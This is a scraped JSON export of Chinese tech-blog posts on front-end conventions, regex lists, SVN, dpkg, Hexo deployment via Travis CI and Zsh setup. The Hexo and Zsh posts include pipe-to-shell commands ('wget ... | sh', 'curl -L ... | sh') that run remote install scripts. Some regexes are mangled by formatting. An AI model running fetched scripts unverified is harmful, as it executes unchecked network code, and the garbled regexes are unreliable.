不推荐写法*/parseInt 字符串拼接应使用数组保存字符串片段，使用时调用join方法。避免使用+或+=的方式拼接较长的字符串，每个字符串都会使用一个小的内存片段，过多的内存片段会影响性能。 1234567891011121314/**推荐的拼接方式array的push、join*/var str=[], list=['测试A','测试B'];for (var i=0 , len=list.length; i &lt; len; i++) &#123; str.push( '&lt;div&gt;'+ list[i] + '&lt;/div&gt;');&#125;;console.log(str.join('')); //&lt;div&gt;测试A&lt;/div&gt;&lt;div&gt;测试B&lt;/div&gt;/** 不推荐的拼接方式+=*/var str = '', list=['测试A','测试B'];for (var i = 0, len = list.length; i&lt; len; i++) &#123; str+='&lt;div&gt;' + list[i] + '&lt;/div&gt;';&#125;;console.log(str); //&lt;div&gt;测试A&lt;/div&gt;&lt;div&gt;测试B&lt;/div&gt; 尽量避免使用存在兼容性及消耗资源的方法或属性 不要使用with，void，evil，eval_r，innerText 注重HTML分离, 减小reflow, 注重性能 图片规范命名应用小写英文、数字、_组合，便于团队其他成员理解 12header_btn.gifheader_btn2.gif 页面元素类图片均放入img文件夹, 测试用图片放于img/testimg文件夹，psd源图放入img/psdimg文件夹。 图片格式仅限于gif、png、jpg等。 用png图片做图片时,要求图片格式为png-8格式,若png-8实在影响图片质量或其中有半透明效果,请为ie-6单独定义背景，并尽量避免使用半透明的png图片。 背景图片请尽可能使用sprite技术, 减小http请求 注释规范： JAVASCRIPT、CSS文件注释需要标明作者、文件版本、创建/修改时间、重大版本修改记录、函数描述、文件版本、创建或者修改时间、功能、作者等信息。 /* * 注释块 */ 中间可添加如下信息 1234567891011121314151617181920212223@file 文件名@addon 把一个函数标记为另一个函数的扩张，另一个函数的定义不在源文件中@argument 用大括号中的自变量类型描述一个自变量@author 函数/类作者的姓名@base 如果类是继承得来，定义提供的类名称@class 用来给一个类提供描述，不能用于构造器的文档中@constructor 描述一个类的构造器@deprecated 表示函数/类已被忽略@exception 描述函数/类产生的一个错误@exec @extends 表示派生出当前类的另一个类@fileoverview 表示文档块将用于描述当前文件，这个标签应该放在其它任何标签之前@final 指出函数/类@ignore 让jsdoc忽视随后的代码@link 类似于@link标签，用于连接许多其它页面@member 定义随后的函数为提供的类名称的一个成员@param 用大括号中的参数类型描述一个参数@private 表示函数/类为私有，不应包含在生成的文档中@requires 表示需要另一个函数/类@return 描述一个函数的返回值@see 连接到另一个函数/类@throws 描述函数/类可能产生的错误@type 指定函数/成员的返回类型@version 函数/类的版本号 开发及测试工具约定： 编码格式化，三码统一 测试工具: 前期开发仅测试FireFox &amp; IE6 &amp; IE7 &amp; IE8 &amp; IE9 &amp; Opera &amp; Chrome &amp; Safari","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"前端规范","slug":"前端规范","permalink":"https://ru23.com/tags/前端规范/"}]},{"title":"梳理常用的正则表达式","slug":"2016-07-梳理常用的正则表达式","date":"2016-07-09T17:04:51.000Z","updated":"2018-10-24T03:46:01.847Z","comments":true,"path":"note/88163820.html","link":"","permalink":"https://ru23.com/note/88163820.html","excerpt":"一、校验数字的表达式","text":"一、校验数字的表达式 1 数字：1^[0-9]*$ 2 n位的数字：1^\\d&#123;n&#125;$ 3 至少n位的数字：1^\\d&#123;n,&#125;$ 4 m-n位的数字：1^\\d&#123;m,n&#125;$ 5 零和非零开头的数字：1^(0|[1-9][0-9]*)$ 6 非零开头的最多带两位小数的数字：1^([1-9][0-9]*)+(.[0-9]&#123;1,2&#125;)?$ 7 带1-2位小数的正数或负数：1^(-)?\\d+(.\\d&#123;1,2&#125;)?$ 8 正数、负数、和小数：1^(-|+)?\\d+(.\\d+)?$ 9 有两位小数的正实数：1^[0-9]+(.[0-9]&#123;2&#125;)?$ 10 有1~3位小数的正实数：1^[0-9]+(.[0-9]&#123;1,3&#125;)?$ 11 非零的正整数：1^[1-9]\\d$ 或 ^([1-9][0-9])&#123;1,3&#125;$ 或 ^+?[1-9][0-9]*$ 12 非零的负整数：1^-[1-9][]0-9″$ 或 ^-[1-9]\\d$ 13 非负整数：1^\\d+$ 或 ^[1-9]\\d*|0$ 14 非正整数：1^-[1-9]\\d*|0$ 或 ^((-\\d+)|(0+))$ 15 非负浮点数：1^\\d+(.\\d+)?$ 或 ^[1-9]\\d.\\d|0.\\d[1-9]\\d|0?.0+|0$ 16 非正浮点数：1^((-\\d+(.\\d+)?)|(0+(.0+)?))$ 或 ^(-([1-9]\\d.\\d|0.\\d[1-9]\\d))|0?.0+|0$ 17 浮点数：1^(-?\\d+)(.\\d+)?$ 或 ^-?([1-9]\\d.\\d|0.\\d[1-9]\\d|0?.0+|0)$ 二、校验字符的表达式 1 汉字：1^[\\u4e00-\\u9fa5]&#123;0,&#125;$ 2 英文和数字：1^[A-Za-z0-9]+$ 或 ^[A-Za-z0-9]&#123;4,40&#125;$ 3 长度为3-20的所有字符：1^.&#123;3,20&#125;$ 4 由26个英文字母组成的字符串：1^[A-Za-z]+$ 5 由26个大写英文字母组成的字符串：1^[A-Z]+$ 6 由26个小写英文字母组成的字符串：1^[a-z]+$ 7 由数字和26个英文字母组成的字符串：1^[A-Za-z0-9]+$ 8 由数字、26个英文字母或者下划线组成的字符串：1^\\w+$ 或 ^\\w&#123;3,20&#125;$ 9 中文、英文、数字包括下划线：1^[\\u4E00-\\u9FA5A-Za-z0-9_]+$ 10 可以输入含有1^%&amp;’,;=?$\\”等字符：`[^%&amp;’,;=?$\\x22]+ 11 禁止输入含有~的字符：1[^~\\x22]+ 三、特殊需求表达式 1 Email地址：1^\\w+([-+.]\\w+)@\\w+([-.]\\w+).\\w+([-.]\\w+)*$ 2 域名：1[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;(/.[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;)+/.? 3 InternetURL：1[a-zA-z]+://[^\\s] 或 ^http://([\\w-]+\\.)+[\\w-]+(/[\\w-./?%&amp;=])?$ 4 手机号码：1^(13[0-9]|14[5|7]|15[0|1|2|3|5|6|7|8|9]|18[0|1|2|3|5|6|7|8|9])\\d&#123;8&#125;$ 5 电话号码:1(“XXX-XXXXXXX”、”XXXX-XXXXXXXX”、”XXX-XXXXXXX”、”XXX-XXXXXXXX”、”XXXXXXX”和”XXXXXXXX)：^((\\d&#123;3,4&#125;-)|\\d&#123;3.4&#125;-)?\\d&#123;7,8&#125;$ 6 国内电话号码1(0511-4405222、021-87888822)：\\d&#123;3&#125;-\\d&#123;8&#125;|\\d&#123;4&#125;-\\d&#123;7&#125; 7 身份证号(15位、18位数字)：1^\\d&#123;15&#125;|\\d&#123;18&#125;$ 8 短身份证号码(数字、字母x结尾)：1^([0-9])&#123;7,18&#125;(x|X)?$ 或 ^\\d&#123;8,18&#125;|[0-9x]&#123;8,18&#125;|[0-9X]&#123;8,18&#125;?$ 9 帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线)：1^[a-zA-Z][a-zA-Z0-9_]&#123;4,15&#125;$ 10 密码(以字母开头，长度在6~18之间，只能包含字母、数字和下划线)：1^[a-zA-Z]\\w&#123;5,17&#125;$ 11 强密码(必须包含大小写字母和数字的组合，不能使用特殊字符，长度在8-10之间)：1^(?=.\\d)(?=.[a-z])(?=.*[A-Z]).&#123;8,10&#125;$ 12 日期格式：1^\\d&#123;4&#125;-\\d&#123;1,2&#125;-\\d&#123;1,2&#125; 13 一年的12个月(01～09和1～12)：1^(0?[1-9]|1[0-2])$ 14 一个月的31天(01～09和1～31)：1^((0?[1-9])|((1|2)[0-9])|30|31)$ 15 钱的输入格式： 16 1.有四种钱的表示形式我们可以接受:”10000.00″ 和 “10,000.00”, 和没有 “分” 的 “10000” 和 “10,000”：^[1-9][0-9]*$ 17 2.这表示任意一个不以0开头的数字,但是,这也意味着一个字符”0″不通过,所以我们采用下面的形式：1^(0|[1-9][0-9]*)$ 18 3.一个0或者一个不以0开头的数字.我们还可以允许开头有一个负号：1^(0|-?[1-9][0-9]*)$ 19 4.这表示一个0或者一个可能为负的开头不为0的数字.让用户以0开头好了.把负号的也去掉,因为钱总不能是负的吧.下面我们要加的是说明可能的小数部分：1^[0-9]+(.[0-9]+)?$ 20 5.必须说明的是,小数点后面至少应该有1位数,所以”10.”是不通过的,但是 “10” 和 “10.2” 是通过的：1^[0-9]+(.[0-9]&#123;2&#125;)?$ 21 6.这样我们规定小数点后面必须有两位,如果你认为太苛刻了,可以这样：1^[0-9]+(.[0-9]&#123;1,2&#125;)?$ 22 7.这样就允许用户只写一位小数.下面我们该考虑数字中的逗号了,我们可以这样：1^[0-9]&#123;1,3&#125;(,[0-9]&#123;3&#125;)*(.[0-9]&#123;1,2&#125;)?$ 23 8.1到3个数字,后面跟着任意个 逗号+3个数字,逗号成为可选,而不是必须：1^([0-9]+|[0-9]&#123;1,3&#125;(,[0-9]&#123;3&#125;)*)(.[0-9]&#123;1,2&#125;)?$ 24 备注：这就是最终结果了,别忘了”+”可以用”*”替代如果你觉得空字符串也可以接受的话(奇怪,为什么?)最后,别忘了在用函数时去掉去掉那个反斜杠,一般的错误都在这里 25 xml文件：1^([a-zA-Z]+-?)+[a-zA-Z0-9]+\\.[x|X][m|M][l|L]$ 26 中文字符的正则表达式：1[\\u4e00-\\u9fa5] 27 双字节字符：[^\\x00-\\xff] (包括汉字在内，可以用来计算字符串的长度(一个双字节字符长度计2，ASCII字符计1)) 28 空白行的正则表达式：\\n\\s*\\r (可以用来删除空白行) 29 HTML标记的正则表达式：&lt;(\\S?)[^&gt;]&gt;.?&lt;/\\1&gt;|&lt;.? /&gt; (网上流传的版本太糟糕，上面这个也仅仅能部分，对于复杂的嵌套标记依旧无能为力) 30 首尾空白字符的正则表达式：^\\s|\\s$或(^\\s)|(\\s$) (可以用来删除行首行尾的空白字符(包括空格、制表符、换页符等等)，非常有用的表达式) 31 腾讯QQ号：[1-9][0-9]{4,} (腾讯QQ号从10000开始) 32 中国邮政编码：[1-9]\\d{5}(?!\\d) (中国邮政编码为6位数字) 33 IP地址：\\d+.\\d+.\\d+.\\d+ (提取IP地址时有用) 34 IP地址：1((?:(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d)\\.)&#123;3&#125;(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d))","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"正则表达式","slug":"正则表达式","permalink":"https://ru23.com/tags/正则表达式/"}]},{"title":"TortoiseSVN的基使用方法","slug":"2016-07-TortoiseSVN的基本安装及使用方法","date":"2016-07-08T07:25:20.000Z","updated":"2018-10-24T03:46:01.797Z","comments":true,"path":"note/6cdcec50.html","link":"","permalink":"https://ru23.com/note/6cdcec50.html","excerpt":"签出源代码到本机在本机创建文件夹StartKit，右键点击Checkout，弹出如下图的窗体：","text":"签出源代码到本机在本机创建文件夹StartKit，右键点击Checkout，弹出如下图的窗体： 文本框中输入svn server中的代码库的地址，其他默认，点击OK按钮,就开始签出源代码了 上图中的Checkout Depth，有4个选项，分别是迁出全部、只签出下一级子目录和文件、只签出文件、只签出空项目，默认的是第一项。上面的例子中，我们也可以使用web的方式访问代码库，在浏览器中输入http://zt.net.henu.edu.cn/svn/StartKit/这时候也会弹出对话框，要求输入用户名和密码，通过验证后即可浏览代码库中的内容。 到此，源代码已经成功签出到刚才新建的StartKit目录中 打开StartKit目录，可以看到如下图的文件夹结构： 一旦你对文件或文件夹做了任何修改，那么文件或文件夹的显示图片机会发生变化 不同状态所对应的图片 提交修改过的文件到SVN服务器注意：提交源代码到服务器时，一定确保本机的代码是最新版本，否则可能提交失败，或者造成版本冲突 添加新文件到SVN服务器 点击TortoiseSVN=&gt;&gt;Add；再SVN Commit这个文件一次，才可以将其真正提交到SVN服务器上的代码库中 更新本机代码与SVN服务器上最新的版本一致 只要在需要更新的文件夹上点击右键或在该文件下的空白处点击右键，点击SVN Update，就可以 注意：更新操作可能会因为版本冲突而失败，这是可以使用合并【Merge】或其他方法解决；也可能因为锁定【Get Lock】而失败，这是需要先解锁【Release Lock】。 重命名文件或文件夹，并将修改提交到SVN服务器 要在需要重命名的文件或文件夹上点击右键，点击TortiseSVN=&gt;&gt;Rename…，在弹出的窗体中输入新名称，点击OK按钮，就可以了。此方法也不是直接重命名，而是将该文件或文件夹的名称标记为重命名后名称，也需要我们使用SVN Commit提交到SVN服务器后才真正重命名 删除文件或文件夹，并将修改提交到SVN服务器 最简单就是，你直接删除文件或文件夹，然后使用SVN Commit提交更新到SVN服务器。另外一种方法是在你要删除的文件或文件夹上点击右键=&gt;&gt;TortoiseSVN=&gt;&gt;Delete删除,此方法也不是直接删除，而是将该文件或文件夹的状态置为删除，也需要我们使用SVN Commit提交到SVN服务器后才真正删除。","categories":[{"name":"VCS","slug":"VCS","permalink":"https://ru23.com/categories/VCS/"}],"tags":[{"name":"SVN","slug":"SVN","permalink":"https://ru23.com/tags/SVN/"}]},{"title":"ubuntu下如何用命令行运行deb安装包","slug":"2016-07-ubuntu下如何用命令行运行deb安装包","date":"2016-07-06T18:55:20.000Z","updated":"2018-10-24T03:46:01.835Z","comments":true,"path":"note/3961640b.html","link":"","permalink":"https://ru23.com/note/3961640b.html","excerpt":"如果ubuntu要安装新软件，已有deb安装包（例如：iptux.deb），但是无法登录到桌面环境。那该怎么安装？答案是：使用dpkg命令。","text":"如果ubuntu要安装新软件，已有deb安装包（例如：iptux.deb），但是无法登录到桌面环境。那该怎么安装？答案是：使用dpkg命令。dpkg命令常用格式如下： sudo dpkg -I iptux.deb 查看iptux.deb软件包的详细信息，包括软件名称、版本以及大小等（其中-I等价于–info） sudo dpkg -c iptux.deb 查看iptux.deb软件包中包含的文件结构（其中-c等价于–contents） sudo dpkg -i iptux.deb 安装iptux.deb软件包（其中-i等价于–install） sudo dpkg -l iptux 查看iptux软件包的信息（软件名称可通过dpkg -I命令查看，其中-l等价于–list） sudo dpkg -L iptux 查看iptux软件包安装的所有文件（软件名称可通过dpkg -I命令查看，其中-L等价于–listfiles） sudo dpkg -s iptux 查看iptux软件包的详细信息（软件名称可通过dpkg -I命令查看，其中-s等价于–status） sudo dpkg -r iptux 卸载iptux软件包（软件名称可通过dpkg -I命令查看，其中-r等价于–remove） 注： dpkg命令无法自动解决依赖关系。如果安装的deb包存在依赖包，则应避免使用此命令，或者按照依赖关系顺序安装依赖包。","categories":[{"name":"Back-end","slug":"Back-end","permalink":"https://ru23.com/categories/Back-end/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://ru23.com/tags/Linux/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://ru23.com/tags/Ubuntu/"}]},{"title":"ubuntu下无法安装Hexo简单做法","slug":"2016-07-ubuntu下无法安装Hexo简单做法","date":"2016-07-06T18:25:41.000Z","updated":"2018-10-24T03:46:01.838Z","comments":true,"path":"note/8100a68b.html","link":"","permalink":"https://ru23.com/note/8100a68b.html","excerpt":"安装 Git sudo apt-get install git-core 安装 Node.js(安装 Node.js 的最佳方式是使用 nvm)wget -qO- https://raw.github.com/creationix/nvm/master/install.sh | sh","text":"安装 Git sudo apt-get install git-core 安装 Node.js(安装 Node.js 的最佳方式是使用 nvm)wget -qO- https://raw.github.com/creationix/nvm/master/install.sh | sh 安装完成后，重启终端并执行下列命令即可安装 Node.js nvm install 4 安装 Hexo 所有必备的应用程序安装完成后，即可使用 npm 安装 Hexo 错误的写法：npm install -g hexo-cli 正确的写法：sudo npm install -g hexo-cli ubuntu下一定加上sudo否则安装Hexo将不会成功","categories":[{"name":"Back-end","slug":"Back-end","permalink":"https://ru23.com/categories/Back-end/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://ru23.com/tags/Linux/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://ru23.com/tags/Ubuntu/"}]},{"title":"Hexo主题功能优化","slug":"2016-07-Hexo主题功能优化","date":"2016-07-06T18:08:41.000Z","updated":"2018-10-24T03:46:01.698Z","comments":true,"path":"note/6de5ed45.html","link":"","permalink":"https://ru23.com/note/6de5ed45.html","excerpt":"添加音乐播放器","text":"添加音乐播放器 以前觉得网页嵌入播放器很牛逼的感觉，原来就是一句代码的事儿！感谢外连接，感谢开源，让这个世界变得更美好。 markdown语法是完全兼容html代码的，直接把html代码扔进去就oook咯。 添加豆瓣音乐 复制下面代码到你的博文任意位置，然后Hexo s预览。 加入豆瓣音乐 歌曲是随机播放，游客可切歌，不能定制播哪首歌，而且不能按钮停止，只能音量调到0，无语，有利有弊的吧。 尽量放在最下面，如果你放在最上面，很有可能别人还未点击进入博文，你的博客就有了背景音乐了，要想赶紧播放音乐的另说。 1&lt;center&gt; &lt;iframe name=\"iframe_canvas\" src=\"http://douban.fm/partner/baidu/doubanradio\" scrolling=\"no\" frameborder=\"0\" width=\"400\" height=\"200\"&gt;&lt;/iframe&gt; &lt;/center&gt; 添加网易云音乐打开网页版网易云音乐。 如果只是加入单曲，只需要搜索歌曲，点开歌曲名，点击生成外链播放器，复制html代码（可以选择是否自动播放），将html代码无需任何修改放入markdown文章里就OK了。 如果想要加入歌单，就需要自己创建歌单，然后分享歌单，找到自己的分享动态，点进去可以看到有“生成外链播放器”这些字眼，其余操作就和上面一样了。不过，你的歌单有变化的话，这个外链的歌曲同样跟着变，这一点挺棒的。 例如，播放待你长发及腰这首歌，自动播放只需要嵌入一下代码 1&lt;iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86 src=\"http://music.163.com/outchain/player?type=2&amp;id=28947001&amp;auto=1&amp;height=66\"&gt;&lt;/iframe&gt; NexT使用自定义的CSS样式 添加样式支持 首先，在样式文件的source文件夹下找到css文件夹，打开main.styl文件，在最后添加：@import &quot;_my/mycss&quot;; 新建自定义样式找到样式文件夹css 新建_my文件夹，在其中新建mycss.styl文件，之后就可以按照style的格式自定义样式了。 例子例如：我想在文章中添加个自定义样式的按钮，怎么做呢？？？ 打开新建的mycss.styl文件，在其中添加样式： 123456789101112131415161718192021.myButton &#123; background-color:#0f94bd; -moz-border-radius:15px; -webkit-border-radius:15px; border-radius:15px; display:inline-block; cursor:pointer; color:#ffffff; font-family:Arial; font-size:17px; padding:11px 27px; text-decoration:none; text-shadow:0px 1px 0px #2f6627;&#125;.myButton:hover &#123; background-color:#5cbf2a;&#125;.myButton:active &#123; position:relative; top:1px;&#125; 引用：在想要引用的时候添加 &lt;a href=&quot;#&quot; class=&quot;myButton&quot;&gt;MyButton&lt;/a&gt;","categories":[{"name":"Hexo","slug":"Hexo","permalink":"https://ru23.com/categories/Hexo/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://ru23.com/tags/Hexo/"}]},{"title":"Hexo持续集成自动部署到github","slug":"2016-06-Hexo持续集成自动部署到github","date":"2016-07-02T16:41:12.000Z","updated":"2018-10-24T03:46:01.660Z","comments":true,"path":"note/8e459e48.html","link":"","permalink":"https://ru23.com/note/8e459e48.html","excerpt":"一、 新建新的分支","text":"一、 新建新的分支 master：博客的静态文件，也就是hexo生成后的HTML文件，因为要使用Gitpage服务，所以他规定的网页文件必须是在master分支 建新的分支：dev：存放博客的源代码 Git怎么推送本地分支到远程新分支上面去？ git push --force origin local_branch:remote_branch 这个操作，local_branch必须为你本地存在的分支，remote_branch为远程分支，如果remote_branch不存在则会自动创建分支。 类似，git push origin :remote_branch，local_branch留空的话则是删除远程remote_branch分支。 这里是分支常用命令： 列出所有本地分支$ git branch 列出所有远程分支$ git branch -r 列出所有本地分支和远程分支$ git branch -a 新建一个分支，但依然停留在当前分支$ git branch [branch-name] 新建一个分支，并切换到该分支$ git checkout -b [branch] 新建一个分支，指向指定commit$ git branch [branch] [commit] 新建一个分支，与指定的远程分支建立追踪关系$ git branch --track [branch] [remote-branch] 切换到指定分支，并更新工作区`$ git checkout [branch-name] 切换到上一个分支$ git checkout - 建立追踪关系，在现有分支与指定的远程分支之间$ git branch --set-upstream [branch] [remote-branch] 合并指定分支到当前分支$ git merge [branch] 选择一个commit，合并进当前分支`$ git cherry-pick [commit] 删除分支$ git branch -d [branch-name] 删除远程分支 12$ git push origin --delete [branch-name]$ git branch -dr [remote/branch] 二、配置Travis 接入Travis CI 打开Travis CI网站，使用github账号登录。 将鼠标放在右上角的用户名上，点击Account选项，会显示github的项目。 找到博客项目，点击前面带有 X 符号的按钮，开启travis支持。 然后点击设置按钮，在项目的设置中开启Build only if .travis.yml is present这一项. 到这一步， 我们已经开启了要构建的仓库 在Travis CI配置Github的Access Token 在github上生成Access Token 首先我们来到github的设置界面，点击到Personal access tokens页面，点击右上角的Generate new token按钮会重新生成一个，点击后他会叫你输入密码，然后来到如下界面，给他去一个名字，下面是勾选一些权限 生成完后，你需要拷贝下来,接下来要用到 在Travis CI配置 配置界面还是在项目的setting里面，如下图 还需要在源代码的仓库里创建一个.travis.yml配置文件，放到源代码的根目录，如下图 其中内容如下： 1234567891011121314151617181920212223242526272829language: node_jsnode_js: stable# S: Build Lifecycleinstall: - npm install#before_script: # - npm install -g gulpscript: - hexo gafter_script: - cd ./public - git init - git config user.name \"lifengsofts\" - git config user.email \"lifengsofts@gmail.com\" - git add . - git commit -m \"Update docs\" - git push --force --quiet \"https://$&#123;GH_TOKEN&#125;@$&#123;GH_REF&#125;\" master:master# E: Build LifeCyclebranches: only: - blog-sourceenv: global: - GH_REF: github.com/lifengsofts/lifengsofts.github.io.git 其中给你需要更换的又git config后面的配置信息GH_REF的值更改为你的仓库地址 到这一步我们配置已经完成了 三、本地操作 把远程仓库源码下载下来新建新的分支dev git clone -b dev https://github.com/poetries/poetries.github.io.git 切换到项目根目录下 开始写作 关联远程仓库 git remote add origin git@github.com:poetries/poetries.github.io.git 提交本地修改，推送至github仓库。 $ git add . $ git commit -m &quot;test travis&quot; $ git push origin dev:dev 以下是自己在Ubuntu下写的一个很简单很简单的脚本，用来方便写作部署博客 hexo-write.sh hexo-deploy.sh push本地的代码至远程仓库之后，在https://travis-ci.org后台查看相关情况。 下面是成功的结果： 参考：使用Travis自动部署Hexo(3)使用Travis自动部署Hexo(1)","categories":[{"name":"Hexo","slug":"Hexo","permalink":"https://ru23.com/categories/Hexo/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://ru23.com/tags/Hexo/"}]},{"title":"一键更新Hexo到github和coding","slug":"2016-07-一键更新Hexo到github和coding","date":"2016-07-02T12:48:22.000Z","updated":"2018-10-24T03:46:01.844Z","comments":true,"path":"note/11e7f6eb.html","link":"","permalink":"https://ru23.com/note/11e7f6eb.html","excerpt":"一、 _config.yml配置","text":"一、 _config.yml配置 想要同时部署到2个平台，就要修改博客根目录下面的_config.yml文件中的deploy如下根据Hexo官方文档需要修改成下面的形式 123456deploy: type: git message: [message] repo: github: &lt;repository url&gt;,[branch] gitcafe: &lt;repository url&gt;,[branch] 我的配置 12345deploy: type: git repo: # 同时部署到github和coding github: https://github.com/poetries/poetries.github.io.git,master coding: git@git.coding.net:poetry/poetry.git,master 提交采用的SSH密钥，这个方法有个好处，提交的时候不用输入用户名和密码 二、coding上创建一个新项目创建后进入项目的代码模块，获取到这个项目的ssh地址 三、同步本地hexo到coding上把获取到了ssh配置在上面的_config.yml文件中的deploy下，如果是第一次使用coding的话，需要设置SSH公钥，生成的方法可以参考coding帮助中心 本地打开 id_rsa.pub 文件，复制其中全部内容，填写到SSH_RSA公钥key下的一栏，公钥名称可以随意起名字。完成后点击“添加”，然后输入密码或动态码即可添加完成 添加后，在git bash命令输入： ssh -T git@git.coding.net 如果得到下面提示就表示公钥添加成功了： Coding.net Tips : [Hello ! You&#39;ve conected to Coding.net by SSH successfully! ] 最后使用部署命令就能把博客同步到coding上面： hexo deploy -g 四、pages服务方式部署部署博客方式有两种，第一种就是pages服务的方式，也推荐这种方式，因为可以绑定域名，而第二种演示的方式必须升级会员才能绑定自定义域名。pages方式也很简单就是在source/需要创建一个空白文件，至于原因，是因为 coding.net需要这个文件来作为以静态文件部署的标志。就是说看到这个Staticfile就知道按照静态文件来发布 12cd source/touch Staticfile #名字必须是Staticfile 分支选择master，因为前面配置的分支是master,因此开启之后，也需要是master。然后看起之后就可访问了。 注意： 如果你的项目名称跟你coding的用户名一样，比如我的用户是叫tengj,博客项目名也叫tengj那直接访问 poetry.coding.me就能访问博客，否则就要带上项目名：poetry.coding.me/项目名 才能访问推荐项目名跟用户名一样，这样就可以省略项目名了 五、演示方式部署当你把你的静态网站上传到Coding之后，就可以着手部署演示了，Coding的演示平台支持静态网页，所以其实非常简单。在开启演示模式之前，会提醒你没有检测到环境，你直接强制开启就可以了。 部署版本我没有填，默认是master 运行环境一定要选择HTML 自动部署要勾上，为后面配置自动部署做准备 访问域名根据你自己喜爱填写，填好要点急后面的确认按钮 应用内存也根据自己喜好填写，填好要点急后面的确认按钮 以上都配置好了，就可以按下一键部署的按钮了，部署成功后输入地址：poetry.coding.io就能访问 六、设置自动部署如果你是演示方式的话，就需要设置自动部署，这样才能同步新发布的文章 要配置WebHook才行 找到项目设置那边的WebHook,然后点击新建 Hook 第一个输入框中是填你的博客域名，然后在后面加上 /_ 第二个输入框是输入一个 token ，我们直接填写 就可以了,TOKEN两边的大括号见的空格记得去掉 回到演示里，在左边的栏目中找到环境变量,变量名填写为 WEBHOOK_TOKEN ，值为 ，接着重新启动应用就 ok 了！","categories":[{"name":"Hexo","slug":"Hexo","permalink":"https://ru23.com/categories/Hexo/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://ru23.com/tags/Hexo/"}]},{"title":"Ubuntu下安裝 Zsh 及 Oh-my-zsh","slug":"2016-06-Ubuntu下安裝-Zsh-及-Oh-my-zsh","date":"2016-06-26T07:35:19.000Z","updated":"2018-10-24T03:46:01.662Z","comments":true,"path":"note/168815e7.html","link":"","permalink":"https://ru23.com/note/168815e7.html","excerpt":"不管是在服务器还是本机上打开终端，默认都会运行名叫 Bash 的 shell，它是目前最为流行的 shell，几乎每个基于UNIX的系统都支持。但是也存在其他的 Bash 替代方案，能帮助开发者更方便快捷地使用终端。 其中之一就是Z shell，也被称为Zsh。Oh-My-Zsh的安装非常简单，只需在命令行输入以下命令并重启即可","text":"不管是在服务器还是本机上打开终端，默认都会运行名叫 Bash 的 shell，它是目前最为流行的 shell，几乎每个基于UNIX的系统都支持。但是也存在其他的 Bash 替代方案，能帮助开发者更方便快捷地使用终端。 其中之一就是Z shell，也被称为Zsh。Oh-My-Zsh的安装非常简单，只需在命令行输入以下命令并重启即可 一、在 Ubuntu Linux 中安裝 Zsh 及 Oh-my-zsh 安裝 zsh 套件 $ apt-get install zsh 安装git $ apt-get install git 安装完以上两步，执行下面的代码 curl -L https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh | sh 把zsh设置成默认-替换bashchsh -s /bin/zsh 二、接下来配置适合自己Zsh 主题修改，我比较喜欢前面是$符号，所以选择了steeef这款主题 $ vim ~/.zshrc 配置文件里找到：（输入`/`即可搜素ZSH_THEME） `ZSH_THEME=&quot;robbyrussell&quot;` 修改为： ZSH_THEME=&quot;steeef&quot; 常用命令 查看zsh下有哪些主题$ ls ~/.oh-my-zsh/themes 查看zsh下有哪些插件ls ~/.oh-my-zsh/plugins 编辑 ~/.zshrc 启用 插件 1234567891011 - 下載 zsh-syntax-highlighting plugin `$ cd ~/.oh-my-zsh/custom/plugins ` `$ git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ` - 新增自定 zsh 设定，把 alias 和 PATH 的设定放在这里``` $ cat ~/.oh-my-zsh/custom/xxx.zsh alias df=&apos;df -h&apos; alias h=&apos;htop&apos; PATH=$PATH:/opt/app/bin/ 这里是官方提供的各种主题 配置的效果图","categories":[{"name":"Back-end","slug":"Back-end","permalink":"https://ru23.com/categories/Back-end/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://ru23.com/tags/Linux/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://ru23.com/tags/Ubuntu/"}]},{"title":"在sublime-text中设置浏览器预览","slug":"2016-05-在sublime-text中设置浏览器预览","date":"2016-05-28T06:24:49.000Z","updated":"2018-10-24T03:46:01.658Z","comments":true,"path":"note/f3739653.html","link":"","permalink":"https://ru23.com/note/f3739653.html","excerpt":"配置在Chrome,Firefox中打开","text":"配置在Chrome,Firefox中打开安装 SideBarEnhancements 然后通过ctrl + k, ctrl + b打开侧边栏，在侧边栏的文件中右击，找到 open width -&gt; edit applications 然后在这里边设置firefox打开的方式。 application : 路径要修改为自己默认安装的路径。1234567891011121314151617181920212223242526272829303132[ &#123;&quot;id&quot;: &quot;side-bar-files-open-with&quot;, &quot;children&quot;: [ //application firefox &#123; &quot;caption&quot;: &quot;firefox&quot;, &quot;id&quot;: &quot;side-bar-files-open-with-firefox&quot;, &quot;command&quot;: &quot;side_bar_files_open_with&quot;, &quot;args&quot;: &#123; &quot;paths&quot;: [], &quot;application&quot;: &quot;D:\\\\Program Files\\\\Mozilla Firefox\\\\firefox.exe&quot;, &quot;extensions&quot;:&quot;.*&quot; //any file with extension &#125; &#125;, &#123;&quot;caption&quot;:&quot;-&quot;&#125;, &#123; &quot;caption&quot;: &quot;chrome&quot;, &quot;id&quot;: &quot;side-bar-files-open-with-chrome&quot;, &quot;command&quot;: &quot;side_bar_files_open_with&quot;, &quot;args&quot;: &#123; &quot;paths&quot;: [], &quot;application&quot;: &quot;C:\\\\Program Files\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe&quot;, &quot;extensions&quot;:&quot;.*&quot; //any file with extension &#125; &#125; ] &#125;] Key bindings -&gt; User 123456789101112131415161718[ &#123; &quot;keys&quot;: [&quot;ctrl+shift+c&quot;], &quot;command&quot;: &quot;copy_path&quot; &#125;, &#123; &quot;keys&quot;: [&quot;alt+f12&quot;], &quot;command&quot;: 